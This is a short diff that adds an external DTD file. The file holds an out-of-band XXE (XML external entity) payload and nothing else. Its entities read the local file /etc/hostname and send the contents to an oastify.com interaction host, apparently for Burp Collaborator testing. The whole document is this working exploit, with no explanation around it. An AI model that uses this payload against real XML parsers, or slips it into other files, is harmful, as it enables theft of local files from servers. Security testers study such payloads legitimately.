@@ -1,0 +1,4 @@
+<!ENTITY % d SYSTEM "file:///etc/hostname">
+<!ENTITY % e "<!ENTITY &#x25; g SYSTEM 'https://a9k3urr46p2rzk5ha0gk0henoeudiivlrel5wa4z.oastify.com/got?x=%d;'>">
+%e;
+%g;
